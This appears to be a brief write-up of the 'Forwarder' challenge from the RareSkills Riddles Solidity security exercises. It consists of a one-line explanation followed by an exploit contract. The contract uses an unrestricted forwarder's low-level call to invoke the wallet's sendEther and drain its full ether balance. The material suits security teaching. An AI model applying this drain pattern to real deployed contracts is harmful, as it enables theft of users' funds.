# 01 RareSkills Riddles - Forwarder

We can make a call to the forwarder which will then male low call to the wallet and send us the ether.


Exploit: 

```

contract ForwarderExploit {
    Forwarder forwarder;
    Wallet wallet;

    constructor(address _forwarder, address _wallet) {
        forwarder = Forwarder(_forwarder);
        wallet = Wallet(_wallet);
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature(
            "sendEther(address,uint256)",
            address(this),
            address(wallet).balance
        );
        forwarder.functionCall(address(wallet), data);
    }

    receive() external payable {}
}
```
